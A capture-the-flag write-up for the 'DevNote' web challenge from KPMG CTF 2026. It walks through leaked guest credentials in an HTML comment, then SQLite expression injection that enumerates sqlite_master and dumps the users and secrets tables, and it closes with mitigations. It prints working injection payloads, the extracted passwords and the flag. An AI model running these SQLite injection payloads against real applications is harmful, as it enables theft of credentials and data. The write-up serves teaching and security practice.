---
link: 'writeups/kpmg-ctf-2026/devnote'
title: "DevNote - KPMG CTF 2026"
description: "Writeup for DevNote from KPMG CTF 2026. Leaked guest credentials in HTML comments leading to a developer query interface vulnerable to SQLite injection."
date: 2026-10-25 11:52:00
categories:
  - [Writeups, KPMG CTF 2026]
tags:
  - KPMG-CTF-2026
  - Web
  - SQLi
  - SQLite
  - Information Disclosure
---

# KPMG CTF 2026 - DevNote

---

## Challenge Description

> DevNote is a note-taking application for developers with an internal dashboard. Find a way into the system and recover the hidden flag.

---

## Step 1 - Finding the Initial Credentials

Viewing the HTML source of the login page revealed credentials left behind in an HTML comment:

```html
<!--guest:guest123 -->
```

![Guest credentials in HTML comment](/img/posts/kpmg-ctf-2026-60_devnote_guest_creds.webp)

We logged in with `guest:guest123` and landed on the dashboard.

---

## Step 2 - Finding the Injection Point

The dashboard exposed a search interface that passed queries through a `q` parameter:

```text
/dashboard?q=
```

Supplying a random string like `?q=test` threw a database error:

```text
no such column: test
```

![SQL error from test input](/img/posts/kpmg-ctf-2026-61_devnote_sqli_hint.webp)

Because the application complained that the input was not a column name instead of searching for that text, we knew the input was being evaluated directly as a SQL expression rather than a parameter in a `WHERE` clause.

We checked the database engine by calling SQLite's version function:

```sql
sqlite_version()
```

![SQLite version confirmed](/img/posts/kpmg-ctf-2026-62_devnote_sqlite_version.webp)

The app returned `3.46.1`, confirming SQLite was running on the backend.

---

## Step 3 - Enumerating the Database Schema

With expression injection in SQLite, subqueries wrapped in parentheses can extract arbitrary data. We queried `sqlite_master` to find all table names:

```sql
(SELECT group_concat(name) FROM sqlite_master WHERE type IN ('table','view'))
```

![Listing tables from sqlite_master](/img/posts/kpmg-ctf-2026-63_devnote_tables.webp)

The database contained two tables: `users` and `secrets`.

We dumped the schema definitions for both:

```sql
(SELECT sql FROM sqlite_master WHERE name='users')
(SELECT sql FROM sqlite_master WHERE name='secrets')
```

![Users table schema](/img/posts/kpmg-ctf-2026-64_devnote_users_schema.webp)

![Secrets table schema](/img/posts/kpmg-ctf-2026-65_devnote_secrets_schema.webp)

The schemas showed:
- `users` had `username` and `password` columns
- `secrets` had a single `data` column

Dumping the `users` table revealed administrative credentials:

```sql
(SELECT group_concat(username || ':' || password, ', ') FROM users)
```

![Extracted passwords](/img/posts/kpmg-ctf-2026-66_devnote_passwords.webp)

```text
admin:Adm1n_Ultra_S3cr3t!
dev:devpassword123
guest:guest123
```

Logging in as `admin` did not display any additional pages or flags. The actual target was in the `secrets` table.

---

## Step 4 - Dumping the Secrets Table

We extracted the contents of `secrets`:

```sql
(SELECT group_concat(data, ', ') FROM secrets)
```

![Extracting the flag from secrets](/img/posts/kpmg-ctf-2026-67_devnote_flag.webp)

The query returned the flag directly on the dashboard.

---

## Flag

```plain
KPMG_CTF{wzW-5DMpXmgCuxyjiq4muxZCJS2mIgj3CqHiGBgkOr0V}
```

---

## Mitigations

| Vulnerability | Fix |
|---|---|
| Plaintext credentials in HTML comments | Strip all debug comments and credentials from production markup |
| Raw SQL expression evaluation | Use parameterized queries and remove arbitrary SQL expression endpoints |
| Database permissions | Restrict the application database user so it cannot query schema catalogs or internal tables |

---

## Summary

The challenge started with leaked guest credentials in an HTML comment. Once inside, the search feature directly evaluated user input as a SQLite column expression. We identified SQLite using `sqlite_version()`, enumerated the database schema through `sqlite_master`, and extracted the flag from the `secrets` table using a subquery.
